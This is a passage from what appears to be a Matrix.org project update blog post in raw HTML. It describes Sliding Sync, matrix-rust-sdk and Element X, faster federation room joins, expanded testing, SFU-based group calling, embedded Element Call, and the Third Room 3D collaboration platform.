&lt;li&gt;Sync encrypted rooms in the background to search for notifications (and for indexing).&lt;&#x2F;li&gt;
&lt;li&gt;More local caching to speed up operations which now require checking the server (e.g. Ctrl&#x2F;Cmd-K room switching)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We also need to determine whether it’s viable to run the sliding-sync proxy against matrix.org for general production use, or whether we’ll need native support in Synapse before we can turn it on by default for everyone.  But these are good problems to have!!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;matrix-rust-sdk-and-element-x&quot;&gt;matrix-rust-sdk and Element X&lt;&#x2F;h3&gt;
&lt;p&gt;Meanwhile, over in the land of Rust, we’ve been making huge progress in maturing and stabilising matrix-rust-sdk and exercising it in Element X: the codename for the next generation of native Element mobile apps.  Most excitingly, we literally just got the first (very alpha) cut of Sliding Sync working in matrix-rust-sdk and hooked up to Element X on iOS - you can see Ștefan’s demo from last week here:&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;6KHQSeJTXm0?start=459&quot; title=&quot;Matrix Live S08E04 — Element Demos&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;matrix-rust-sdk itself is now getting a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;releases&quot;&gt;steady stream of releases&lt;&#x2F;a&gt; - including long-awaited official node bindings, providing excellent and performant encryption support via the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;05&#x2F;16&#x2F;independent-public-audit-of-vodozemac-a-native-rust-reference-implementation-of-matrix-end-to-end-encryption&#x2F;&quot;&gt;newly audited&lt;&#x2F;a&gt; vodozemac Rust implementation of Olm. It’s also great to see loads of major contributions to matrix-rust-sdk from across the wider Matrix community - particularly from Ruma, Fractal, Famedly and others - thank you!! As a result the SDK is shaping up to be much more healthy and heterogeneous than the original matrix-{js,ios,android}-sdk projects.&lt;&#x2F;p&gt;
&lt;p&gt;On Element X itself: matrix-rust-sdk is being used first on iOS in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;element-x-ios&quot;&gt;Element X iOS&lt;&#x2F;a&gt; - aiming first for launching a stable “barbecue” feature set (i.e. personal messaging) asap, followed by adding on “banquet” features (i.e. team collaboration) such as spaces and threads afterwards. We’ve shamelessly misappropriated the barbecue &amp;amp; banquet terminology from Tobias Bernard’s excellent blog post “&lt;a href=&quot;https:&#x2F;&#x2F;blogs.gnome.org&#x2F;tbernard&#x2F;2018&#x2F;05&#x2F;16&#x2F;banquets-and-barbecues&#x2F;&quot;&gt;Banquets and Barbecues&lt;&#x2F;a&gt;” - although, ironically, unlike the post, our plan is still to have a single app which incrementally discloses the banquet functionality as the user’s barbecue starts to sprawl.  We’ve just published the brand new &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;projects&#x2F;1&quot;&gt;development roadmap&lt;&#x2F;a&gt; for Element X from the rust-sdk perspective on GitHub.  Above all else, the goal of Element X is to be the fastest mobile messenger out there in terms of launch and sync time, thanks to Sliding Sync.  Not just for Matrix - but the fastest messenger, full stop :D  Watch this space to see how we do!&lt;&#x2F;p&gt;
&lt;p&gt;Finally: Element is getting a major redesign of the core UI on both iOS and Android - both for today’s Element and Element X.  I’m not going to spoil the final result (which is looking &lt;em&gt;amazing&lt;&#x2F;em&gt;) given it’ll have a proper glossy launch in a few weeks, but you can get a rough idea based on the earlier design previewed by Amsha back in June:&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;oxfqQ0TrTXU?start=34&quot; title=&quot;Matrix Live S07E22 — Element UI experiments, and customising Element Web with greasemonkey&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;In addition to the upcoming overall redesign, Element also landed a complete rework of the login and registration flows last week on iOS and Android - you can see all about it over on the &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;all-aboard-better-ftue-for-less-wtf&#x2F;&quot;&gt;Element blog&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;fast-remote-joins&quot;&gt;Fast Remote Joins&lt;&#x2F;h3&gt;
&lt;p&gt;In terms of performance, the other area that we’re reworking at the protocol level is room joins. &lt;&#x2F;p&gt;
&lt;p&gt;One of the most glaring shortcomings of Matrix happens when a new server admin excitedly decides to join the network, installs a homeserver, tries to join a large room like #matrix:matrix.org, and then looks on in horror as it takes 10+ minutes to join the room, promptly despairs of Matrix being slow and complains bitterly about it all over HN and Reddit :)&lt;&#x2F;p&gt;
&lt;p&gt;The reason for the current behaviour is that the Matrix rooms are replicated between the servers who participate in them - and in the initial design of the protocol we made that replication atomic. In other words, a new server joining a room picks a server from which to acquire the room (typically the one in the room’s alias), and gets sent a copy of all the state events (i.e. structural data) about the room, as well as the last 20 or so messages.  For a big room like Matrix HQ, this can be massive - right now, there are 79,969 state events in the room - and 126,510 auth_chain events (i.e. the events used to justify the existence of the state events).  The reason there are so many is typically that the act of a user joining or parting the room is described by a state event - and in the naive implementation, the server needs to know all current state events in the room (e.g. including parted users), in order to keep in sync with the other servers in the room and faithfully authorise each new event which they receive for that room.&lt;&#x2F;p&gt;
&lt;p&gt;However, each event is typically around 500 bytes in size, and so the act of joining a big room could require generating, transmitting, receiving, authenticating and storing up to 100MB of JSON 😱. This is why joining big rooms for the first time is so painfully slow.&lt;&#x2F;p&gt;
&lt;p&gt;Happily, there is an answer: much as Sliding Sync lets clients synchronise with the bare minimum of data required to render their UI, we’ve created &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;rav&#x2F;proposal&#x2F;partial_state_on_join&#x2F;proposals&#x2F;3706-partial-state-in-send-join.md&quot;&gt;MSC3706&lt;&#x2F;a&gt; (and its precursor &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;matthew&#x2F;msc2775&#x2F;proposals&#x2F;2775-lazy-loading-over-federation.md&quot;&gt;MSC2775&lt;&#x2F;a&gt;) in order to rework the protocol to let servers receive the bare minimum of state needed to join a room in order to participate.  Practically speaking, we only really care about events relevant to the users who are currently participating in the room; the 40,000 other lurkers can be incrementally synced in the background so that our membership list is accurate - but it shouldn’t block us from being able to join or read (or peek) the room.  We already have membership lazyloading in the client-server API to support incrementally loaded membership data, after all.&lt;&#x2F;p&gt;
&lt;p&gt;The problem with this change is that Synapse was written from the outset to assume that each room’s state should be atomically complete: in other words, room state shouldn’t  incrementally load in the background.  So the work for Faster Joins has been an exercise in auditing the entirety of Synapse for this assumption, and generally reviewing and hardening the whole state management system.  This has been &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pulls?q=is%3Apr+%22faster+joins%22+is%3Aclosed+&quot;&gt;loads of work&lt;&#x2F;a&gt; that has been going on since the end of last year - but the end is in sight: you can see the remaining issues &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;milestone&#x2F;8&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;As of right now, faster joins work (although aren’t enabled by default) - with the main proviso that you can’t speak in the room yet until the background sync has completed, and the new implementation has not yet been optimised.  However, thanks to all the preparation work, this should be relatively straightforward, so the end is in sight on this one too.&lt;&#x2F;p&gt;
&lt;p&gt;In terms of performance: right now, joining Matrix HQ via the unoptimised implementation of faster joins completes on a fresh server in roughly 30 seconds - so a &lt;strong&gt;~25x improvement&lt;&#x2F;strong&gt; over the ~12 minutes we’ve seen previously.  However, the really exciting news is that this only requires synchronising 45 state events and 107 auth_chain events to the new server - a &lt;strong&gt;~1400x improvement&lt;&#x2F;strong&gt;!  So there should be significant scope for further optimising the calculation of these 152 events, given 30 seconds to come up with 152 events is definitely on the high side.  In our ideal world, we’d be getting joins down to sub-second performance, no matter how big the room is - once again, watch this space to see how we do. &lt;&#x2F;p&gt;
&lt;p&gt;Finally, alongside faster remote joins, we’re also working on faster local joins.  This work overlaps a bit with the optimisation needed to speed up the faster remote join logic - given we are seeing relatively simple operations unexpectedly taking tens of seconds in both instances. Some of this is needing to batch database activity more intelligently, but we also have some unknown pauses which we’re currently tracking down.  Profiling is afoot, as well as copious Jaeger and OpenTracing instrumentation - the hunt is on!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ratcheting-up-testing&quot;&gt;Ratcheting up testing&lt;&#x2F;h3&gt;
&lt;p&gt;All the work above describes some pretty bold changes to speed up Matrix and improve usability - but in order to land these changes with confidence, avoiding regressions both now and in future, we have really levelled up our testing this year.&lt;&#x2F;p&gt;
&lt;p&gt;Looking at matrix-react-sdk as used by Element Web&#x2F;Desktop: all PRs made to matrix-js-sdk must now pass 80% unit test coverage for new code (measured using &lt;a href=&quot;https:&#x2F;&#x2F;sonarcloud.io&#x2F;project&#x2F;overview?id=matrix-js-sdk&quot;&gt;Sonarqube&lt;&#x2F;a&gt;, enforced as a GitHub PR check). All matrix-react-sdk PRs must be accompanied by a mix of unit tests, end-to-end tests (via &lt;a href=&quot;https:&#x2F;&#x2F;www.cypress.io&#x2F;&quot;&gt;Cypress&lt;&#x2F;a&gt;) and screenshot tests (via &lt;a href=&quot;https:&#x2F;&#x2F;percy.io&#x2F;&quot;&gt;percy.io&lt;&#x2F;a&gt;). All regressions (in both nightly and stable) are retro’d to ensure fixed things stay fixed (usually via writing new tests), and we have converted &lt;a href=&quot;https:&#x2F;&#x2F;arewetsyet.bit.ovh&#x2F;&quot;&gt;fully to typescript&lt;&#x2F;a&gt; for full type safety.&lt;&#x2F;p&gt;
&lt;p&gt;Concretely, since May, we’ve increased js-sdk unit test coverage by ~10% globally, increased react-sdk coverage by ~17%, and added ever more Cypress integration tests to cover the broad strokes.  Cypress now &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;9104&quot;&gt;completely replaces&lt;&#x2F;a&gt; our old Puppeteer-based end-to-end tests, and Sliding Sync work in matrix-react-sdk is being extensively tested by Cypress from the outset (the Sliding Sync PR literally comes with a Cypress test suite).&lt;&#x2F;p&gt;
&lt;p&gt;In mobile land, the situation is more complex given our long-term strategy is to deprecate matrix-ios-sdk and matrix-android-sdk2 in favour of matrix-rust-sdk. matrix-rust-sdk has always had &lt;a href=&quot;https:&#x2F;&#x2F;app.codecov.io&#x2F;gh&#x2F;matrix-org&#x2F;matrix-rust-sdk&quot;&gt;excellent coverage&lt;&#x2F;a&gt;, and in particular, adopting the crypto module in the current matrix-{js,ios,android}-sdk will represent a night and day improvement for quality (not to mention perf!). We’ll also be adopting &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;element-x-ios&#x2F;pull&#x2F;50&quot;&gt;PR checks&lt;&#x2F;a&gt;, and screenshot testing for the mobile SDKs.&lt;&#x2F;p&gt;
&lt;p&gt;On the backend, we continue to build out test cases for our new integration tester &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;complement&quot;&gt;Complement&lt;&#x2F;a&gt; (in Golang), alongside the original &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sytest&quot;&gt;sytest&lt;&#x2F;a&gt; integration test suite (in Perl). In particular, we can now test Synapse in worker mode. The intention with Complement is that it should be homeserver agnostic so that &lt;em&gt;any&lt;&#x2F;em&gt; homeserver implementation can benefit. Indeed the project was initiated by Kegan wearing his Dendrite hat. &lt;&#x2F;p&gt;
&lt;p&gt;Finally, we’ve had a huge breakthrough with true multi-client end-to-end testing in the form of Michael Kaye’s brand new &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;trafficlight&quot;&gt;Traffic Light&lt;&#x2F;a&gt; project. For the first time, we can fully test things like cross signing and verification and VoIP calls end-to-end across completely different platforms and different clients. It’s early days yet, but this really will be a game changer, especially for crypto and VoIP. &lt;&#x2F;p&gt;
&lt;p&gt;Next up, we will turn our attention to a performance testing framework so that we can reliably track performance improvements and regressions in an automated fashion - heavily inspired by Safari’s &lt;a href=&quot;https:&#x2F;&#x2F;www.goodreads.com&#x2F;quotes&#x2F;9844796-don-was-the-one-who-figured-out-how-we-would&quot;&gt;Page Load Test&lt;&#x2F;a&gt; approach. This will be essential as we build out new clients like Element X.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;a-whole-new-world&quot;&gt;A whole new world&lt;&#x2F;h2&gt;
&lt;p&gt;All the stuff above is focused on improving the core performance and usability of Matrix - but in parallel we have also been making enormous progress on entirely new features and capabilities. The following isn’t a comprehensive list, but we wanted to highlight a few of the areas where new development is progressing at a terrifying rate…&lt;&#x2F;p&gt;
&lt;h3 id=&quot;native-voip-conferencing&quot;&gt;Native VoIP Conferencing&lt;&#x2F;h3&gt;
&lt;p&gt;2022 is turning out to be the year that Matrix finally gets fully native voice&#x2F;video conferencing. After speccing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;matthew&#x2F;group-voip&#x2F;proposals&#x2F;3401-group-voip.md&quot;&gt;MSC3401&lt;&#x2F;a&gt; at the end of last year, &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;introducing-native-matrix-voip-with-element-call&#x2F;&quot;&gt;Element Call Beta 1&lt;&#x2F;a&gt; launched as a reference implementation back in March, followed by enabling E2EE, spatial audio and walkie-talkie mode in &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;element-call-beta-2-encryption-spatial-audio-walkie-talkie-mode-and-more&#x2F;&quot;&gt;Element Call Beta 2&lt;&#x2F;a&gt; in June.&lt;&#x2F;p&gt;
&lt;p&gt;However, the catch was that Element Call beta 1 and 2 only ever implemented “full mesh” conferencing - where every participant calls every other participant simultaneously, limiting the size of the conference to ~7 participants on typical hardware, and wasting lots of bandwidth (given you end up sending the same upstream multiple times over for all the other participants).  Element Call has been working surprisingly well in spite of this, but the design of MSC3401 was always to have “foci” (the plural of ‘focus’ - i.e. conference servers) to optionally sit alongside homeservers in order to aggregate the participating calls, a bit like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-08-15-msc3401.jpg&quot; alt=&quot;MSC3401 Architecture&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;With foci, clients only need to send their upstream to their local focus, rather than replicating it across all the other participants - and the focus can then fan it out to other foci or clients as required.  In fact, if no other clients are even watching your upstream, then your client can skip sending an upstream to its focus entirely!&lt;&#x2F;p&gt;
&lt;p&gt;Most importantly, foci are decentralised, just like Matrix: there is no single conference server as a single point of control or failure responsible for powering the group call - users connect to whichever focus is closest to them, and so you automatically get a standards-based heterogeneous network-split-resilient geographically distributed cascading conferencing system with end-to-end-encryption, powered by a potentially infinite number of different implementations.  To the best of our knowledge, this is the first time someone’s proposed an approach like this for decentralised group calling (watch out, Zoom, we’re coming for you!)&lt;&#x2F;p&gt;
&lt;p&gt;Now, the VoIP team have been busy polishing Element Call (e.g. chasing down end-to-end encryption edge cases and reliability), and also figuring out how to embed it into Element and other Matrix clients as a quick way to get excellent group VoIP (more on that later).  As a result, work on building out foci for scalable conferencing had to be pushed down the line.&lt;&#x2F;p&gt;
&lt;p&gt;But in the last few months this completely changed, thanks to an &lt;strong&gt;amazing&lt;&#x2F;strong&gt; open source contribution from Sean DuBois, project lead over at &lt;a href=&quot;https:&#x2F;&#x2F;pion.ly&#x2F;&quot;&gt;Pion&lt;&#x2F;a&gt; - the excellent Golang WebRTC implementation.  Inspired by our &lt;a href=&quot;https:&#x2F;&#x2F;2021.commcon.xyz&#x2F;talks&#x2F;extending-matrix-s-e2ee-calls-to-multiparty&quot;&gt;initial talk&lt;&#x2F;a&gt; about MSC3401 at CommCon, Sean independently decided to see how hard it’d be to build a Selective Forwarding Unit (SFU) focus that implemented MSC3401 semantics using Pion - and published it at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;sean-der&#x2F;sfu-to-sfu&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;sean-der&#x2F;sfu-to-sfu&lt;&#x2F;a&gt; (subsequently donated to github.com&#x2F;matrix-org).  In many ways this was a flag day for Matrix: it’s the first time that a core MSC from the core team has been first implemented from outside the core team (let alone outside the Matrix community!).  It’s the VoIP equivalent of Synapse starting off life as a community contribution rather than being written by the core team.&lt;&#x2F;p&gt;
&lt;p&gt;Either way: Sean’s SFU work has opened the floodgates to making native Matrix conferencing actually scale, with Šimon Brandner and I jumping in to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;pull&#x2F;2423&quot;&gt;implement SFU support&lt;&#x2F;a&gt; in matrix-js-sdk… and as of a few weeks ago we did the first ever SFU-powered Matrix call - which worked impressively well for 12 participants!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-08-15-sfu.jpg&quot; alt=&quot;12 person Element Call&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now, this isn’t released yet, and there is still work to be done, including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;We actually need to select the subset of streams we care about from the focus&lt;&#x2F;li&gt;
&lt;li&gt;We need to support thumbnail streams as well as high-res streams&lt;&#x2F;li&gt;
&lt;li&gt;We need rate control to ensure clients on bad connections don’t get swamped&lt;&#x2F;li&gt;
&lt;li&gt;We need to hook up cascading between foci (although the SFU already supports it!)&lt;&#x2F;li&gt;
&lt;li&gt;We need E2EE via insertable streams&lt;&#x2F;li&gt;
&lt;li&gt;Faster signalling for switching between streams&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;You can see the full todo list for basic and future features over on GitHub.  However, we’re making good progress thanks to Šimon’s work and Sean’s help - but with any luck beta 3 of Element Call might showcase SFU support!&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile it’s worth noting that Element Call is not the only MSC3401 implementation out there - the Hydrogen team has added native support to Hydrogen SDK too (skipping over the old 1:1 calling), so expect to see Element &amp;lt;-&amp;gt; Hydrogen calling in the near future. The Hydrogen implementation is also what powers Third Room (see below…)&lt;&#x2F;p&gt;
&lt;h3 id=&quot;matryoshka-voip-embedding&quot;&gt;Matryoshka VoIP Embedding&lt;&#x2F;h3&gt;
&lt;p&gt;Elsewhere on VoIP, we’ve also been hard at work figuring out how to embed Element Call into Matrix clients in general, starting with Element Web, iOS &amp;amp; Android.  Given MSC3401 is effectively a superset of native 1:1 Matrix VoIP calling, we’d ideally like to replace the current 1:1-only VoIP implementation in Element with an embedded instance of Element Call (not least so we don’t have to maintain it in triplicate over Web&#x2F;iOS&#x2F;Android, and because WebRTC-in-a-webview really isn’t very different to native WebRTC).  To do this efficiently however, the embedded Element Call needs to share the same underlying Matrix client as the parent Element client (otherwise you end up wasting resources and devices and E2EE overhead between the two).  Effectively Element Call ends up needing to parasite off the parent’s client.  We call this approach “matryoshka embedding”, given it resembles nested Russian dolls. 🪆&lt;&#x2F;p&gt;
&lt;p&gt;In practice, we do this by extending the Widget API to let Matrix clients within the widget share the parent’s Matrix client for operations such as sending and receiving to-device messages and accessing TURN servers (c.f. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;travis&#x2F;msc&#x2F;widgets-send-recv-toDevice&#x2F;proposals&#x2F;3819-to-device-messages-for-widgets.md&quot;&gt;MSC3819&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;robintown&#x2F;matrix-doc&#x2F;blob&#x2F;widget-turn-servers&#x2F;proposals&#x2F;3846-widget-turn-servers.md&quot;&gt;MSC3846&lt;&#x2F;a&gt;).  This in turn has been &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-widget-api&#x2F;pull&#x2F;57&quot;&gt;implemented&lt;&#x2F;a&gt; in the matrix-widget-api helper library for widget implementers - and then a few days ago Robin demonstrated the world’s first ever matryoshka embedded Element Call call, looking like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-08-15-matryoshka.jpg&quot; alt=&quot;Matryoshka embedded Element Call&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Note that the MSC3401 events are happening in the actual room where the widget has been added, sent by the right users from Element Web rather than from Element Call, and so are subject to all the normal Matrix access control and encryption semantics.  This is a &lt;em&gt;huge&lt;&#x2F;em&gt; step forwards from embedding Jitsi widgets, where the subsequent call membership and signalling happens in an entirely separate system (XMPP via Prosody, ironically) - instead: this is proper native Matrix calling at last.&lt;&#x2F;p&gt;
&lt;p&gt;Moreover, the same trick could be used to efficiently embed other exotic Matrix clients such as Third Room or &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;toger5&#x2F;TheBoard&quot;&gt;TheBoard&lt;&#x2F;a&gt; - giving the user the choice either to use the app standalone or within the context of their existing Matrix client. Another approach could be to use OIDC scopes to transparently log the embedded client in using the parent’s identity; this has the advantage of no code changes being needed on the embedded client - but has the disadvantage that you needlessly end up running two Matrix clients for the same account side by side, and adding another device to your account, which isn’t ideal for a performance sensitive app like Element Call or Third Room.&lt;&#x2F;p&gt;
&lt;p&gt;Matryoshka embedding isn’t live yet, but between scalable calls via SFU and native Element Call in Element Web&#x2F;iOS&#x2F;Android, the future is looking incredibly exciting for native Matrix VoIP.  We hope to finish embedding Element Call in Element Web&#x2F;iOS&#x2F;Android in Sept&#x2F;Oct - and if we get lucky perhaps the SFU will be ready too and then Element Call can exit beta!&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we also added Video Rooms to Element Web - adding the user interface for an “always on” video room that you can hop into whenever you want.  You can read about it over on the &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;drop-in-drop-out-chats-with-video-rooms-and-a-new-search-experience&#x2F;&quot;&gt;Element blog&lt;&#x2F;a&gt; - the initial implementation uses Jitsi, but once Element Call and Matryoshka embedding is ready, we’ll switch over to using Element Call instead (and add Voice Rooms too!)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-08-15-video-rooms.jpg&quot; alt=&quot;Video Rooms&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;third-room&quot;&gt;Third Room&lt;&#x2F;h3&gt;
&lt;p&gt;Just as MSC3401 and Element Call natively adds decentralised voice&#x2F;video conferences to boring old textual Matrix chatrooms, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3815&quot;&gt;MSC3815&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;blob&#x2F;main&#x2F;README.md&quot;&gt;Third Room&lt;&#x2F;a&gt; go the whole enchilada and adds a full decentralised 3D spatial collaboration environment into your Matrix room - letting you turn your Matrix rooms into a full blown interconnected virtual world.&lt;&#x2F;p&gt;
&lt;p&gt;I can’t overstate how exciting this is: one of the key origins of Matrix was back in Oct 2013 when Amandine and myself found ourselves in Berlin after TechCrunch Disrupt, debating why Second Life hadn’t been more successful - and wondering what you’d have to do to build an immersive 3D social environment which would be as positive and successful as a wildly popular chat network.  Our conclusion was that the first key ingredient you’d need would be a kick-ass open decentralised communication protocol to build it on - providing truly open communication primitives that anyone could build on, much like the open web… and that was what got us thinking about how to build Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;Fast forward 9 years, and Third Room is making &lt;em&gt;spectacular&lt;&#x2F;em&gt; progress in building out this dream, thanks to the incredibly hard work of Robert, Nate and Ajay. The goal of Third Room is to be an open platform layered directly on Matrix for spatial collaboration of any kind: effectively a blank canvas to let folks create freeform collaborative 3D (and in future 2D, VR or AR) experiences, either by using existing assets or building their own user-generated content and functionality. Just like the open web itself, this unlocks a literally infinite range of possibilities, but some of the obvious uses include: spatial telepresence, social VR, 3D visualisation of GIS or weather data, 3D simulated environments, search and rescue and disaster response operations (imagine streaming LIDAR from a drone surveying hurricane devastation into Third Room, where you can then overlay and collaborate on GIS data in realtime), and of course 3D gaming in all its various forms.&lt;&#x2F;p&gt;
&lt;p&gt;Now, we’re hoping to give Third Room a proper launch in a few weeks, so I’m not going to spoil too much right now - but the final pieces which are currently coming together include:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Finalising the initial version of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;tree&#x2F;main&#x2F;src&#x2F;engine&quot;&gt;Manifold&lt;&#x2F;a&gt;, the multi-threaded game engine which powers Third Room (built on &lt;a href=&quot;https:&#x2F;&#x2F;threejs.org&#x2F;&quot;&gt;Three.JS&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;NateTheGreatt&#x2F;bitECS&quot;&gt;bitECS&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;rapier.rs&#x2F;&quot;&gt;Rapier&lt;&#x2F;a&gt;), using SharedArrayBuffers as triple-buffers to synchronise between the various threads.  See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;thirdroom&#x2F;discussions&#x2F;47#discussion-4033099&quot;&gt;this update&lt;&#x2F;a&gt; for a bit more detail on how the engine works.&lt;&#x2F;li&gt;
&lt;li&gt;Finalising the Matrix client interface itself, powered by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;hydrogen-web&#x2F;blob&#x2F;master&#x2F;doc&#x2F;SDK.md&quot;&gt;Hydrogen SDK&lt;&#x2F;a&gt; in order to be as lightweight as possible&lt;&#x2F;li&gt;
&lt;li&gt;Adding in full spatial audio and game networking via MSC3401 and Hydrogen SDK (currently full mesh, but will go SFU as soon as SFUs land!)&lt;&#x2F;li&gt;
&lt;li&gt;Adding in animated avatars (currently using &lt;a href=&quot;https:&#x2F;&#x2F;www.mixamo.com&#x2F;&quot;&gt;Mixamo&lt;&#x2F;a&gt; animations)&lt;&#x2F;li&gt;
&lt;li&gt;Adding in name tags and object labels&lt;&#x2F;li&gt;
&lt;li&gt;Adding in 3D Tile support in order to incrementally load 3D map tiles à la Google Earth&lt;&#x2F;li&gt;
&lt;li&gt;Building an asset pipeline from Unity and Blender through to the glTF assets which Third Room uses.&lt;&#x2F;li&gt;
&lt;li&gt;Initial framework for an in-world direct-manipulation &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;1550534909089189888&quot;&gt;editor&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Lightmap support for beautiful high-performance static lighting and shadows&lt;&#x2F;li&gt;
&lt;li&gt;Full post-processing pipeline (bloom, depth-of-field, anti-aliasing etc)&lt;&#x2F;li&gt;
&lt;li&gt;Integrating with OIDC for login, registration, and account management (see OIDC below)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;As a quick teaser - here’s an example of a &lt;a href=&quot;https:&#x2F;&#x2F;assetstore.unity.com&#x2F;packages&#x2F;3d&#x2F;environments&#x2F;sci-fi&#x2F;3d-scifi-kit-vol-3-121447&quot;&gt;Unity asset&lt;&#x2F;a&gt; exported into Third Room, showing off lightmaps (check out the light and shadows cast by the strip lighting inside, or the shadow on the ground outside).  Ignore the blurry HDR environment map of Venice in the background, which is just there to give the metals something to reflect.  Check out the stats on the right-hand side: on Robert’s M1 Macbook Pro we’re getting a solid 60fps at 2000x1244px, with 13.12ms of unused gametime available for every 16.67ms frame, despite already showing a relatively complicated asset!&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;xvjMyYxZbmM&quot; title=&quot;Third Room prototype demo 1&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;Meanwhile, here are some shots of Robert and Nate chasing each other around the UK City demo environment (also exported from &lt;a href=&quot;https:&#x2F;&#x2F;assetstore.unity.com&#x2F;packages&#x2F;3d&#x2F;environments&#x2F;urban&#x2F;city-builder-london-214943&quot;&gt;Unity&lt;&#x2F;a&gt;), showing off blended Mixamo animations and throwing around crates thanks to the Rapier physics engine.&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;y2mU19QwZPg&quot; title=&quot;Third Room prototype demo 2&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
